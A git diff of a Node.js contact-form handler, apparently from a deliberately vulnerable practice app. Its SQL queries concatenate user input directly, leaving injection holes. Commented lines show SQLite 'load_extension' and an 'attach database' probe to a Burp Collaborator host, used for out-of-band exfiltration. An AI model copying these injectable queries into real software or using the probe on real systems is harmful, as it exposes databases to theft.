@@ -11,7 +11,7 @@ const fs = require('fs');
 const libxmljs = require("libxmljs2");
 const mysql = require('mysql');
 const xml2js = require('xml2js');
-/*
+
 const conmysql = mysql.createConnection({
   host: "localhost",
   user: "root",
@@ -25,7 +25,7 @@ conmysql.connect(function(err) {
   }
   console.log("MySql Connected!");
 });
-*/
+
 
 function resolveAfter2Seconds() {
   return new Promise(resolve => {
@@ -45,8 +45,8 @@ async function asyncCall(author, comment) {
   const result = await resolveAfter2Seconds()
   models.sequelize.query("INSERT INTO contact_ag2rs (author, comment) VALUES ('"+author+"', '"+comment+"');").then((result) => {
 
-    /*
-    //check the data have been save
+    /* TODO a faire marcher, load_extension
+    //check the data have been save 
     //models.sequelize.query('SELECT * FROM contact_ag2rs WHERE author = "'+author+'" order by id desc LIMIT 1').then(([data]) => {
     models.sequelize.query('select load_extension("//dsdsaaaddsd")').then(([data]) => {
     //models.sequelize.query("attach database '/net/rc752wcuose5e4m5ifm4nodmjdpdd2.burpcollaborator.net/z' as z;").then(([data]) => {
@@ -61,14 +61,14 @@ async function asyncCall(author, comment) {
 }
 
 //save email in mysql db
-async function asyncCallXml(email) {
+async function asyncCallMysql(email) {
   let query = 'INSERT INTO user (email) VALUE ("'+email+'")'
   
   conmysql.query(query, function (err, result) {
     if (err) throw err;
 
     let res = utils.queryResultToJson(result)
-    console.log("Result: " + res);
+    console.log("Result mysql insert email: " + res);
   });
 }
 
@@ -76,7 +76,7 @@ module.exports = function contactPage () {
   return (req, res) => {
 
     asyncCall(req.body.author, req.body.comment)
-    asyncCallXml(req.body.email)
+    asyncCallMysql(req.body.email)
     
     res.status(200).json({
         status: 'Working',
